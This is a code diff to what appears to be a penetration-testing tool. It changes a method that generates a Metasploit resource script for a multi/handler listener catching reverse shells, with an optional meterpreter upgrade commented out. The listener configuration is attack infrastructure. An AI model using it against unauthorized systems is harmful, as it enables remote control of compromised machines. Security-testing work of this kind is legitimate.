@@ -204,11 +204,18 @@ class Generic(MetaHandler):
         """
         Generate a rc content to be used in metasploit.
         """
-        if meterpreter is True and self.shell.lower() != "powershell":  # Currently you will need to
-            # upgrade powershell sessions manually with "sessions -u "
-            return """setg SessionLogging true\nsetg TimestampOutput true\nsetg VERBOSE true\nuse exploit/multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset AutoRunScript post/multi/manage/shell_to_meterpreter\nrun -j\n""".format(self.payload, self.host, self.port)
-        else:
-             return """setg SessionLogging true\nsetg TimestampOutput true\nsetg VERBOSE true\nuse exploit/multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nrun -j\n""".format(self.payload, self.host, self.port)
+
+        # This sets the basic information to our handler module.
+        base_rc = "set SessionLogging true\nset TimestampOutput true\nset VERBOSE true\n use exploit/multi/handler\nset PAYLOAD {0}\nset LHOST {1}\nset LPORT {2}\n".format(self.payload, self.host, self.port)
+
+        #  This is not yet implemented.
+        #if meterpreter is True:  # Haha! Lets upgrade this!
+        #    base_rc += "set AutoRunScript post/multi/manage/shell_to_meterpreter\n"
+
+        # After everything is set, we need to finish it with "run -j"
+        base_rc += "run\n"
+
+        return base_rc
 
     def _generate_execution_string(self):
         return "msfconsole -q -r {0}".format(self.file_name)
